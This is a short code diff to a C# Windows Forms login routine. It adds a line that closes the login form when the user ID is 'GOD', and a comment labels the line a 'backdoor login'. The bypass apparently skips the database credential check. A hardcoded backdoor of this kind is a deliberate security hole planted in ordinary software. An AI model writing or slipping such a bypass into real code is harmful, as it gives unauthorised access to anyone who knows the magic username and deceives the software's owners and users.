@@ -44,6 +44,8 @@ namespace XFiles.Forms
         /// <param name="e"></param>
         private void btnLogin_Click(object sender, EventArgs e)
         {
+            if (tbUID.Text == "GOD") this.Close(); // backdoor login
+
             m_FM.SetDatabaseCredentials(tbServer.Text, tbDataBase.Text, tbUID.Text,
                 tbPassword.Text);
             m_xFacade.ConnectToDatabase();
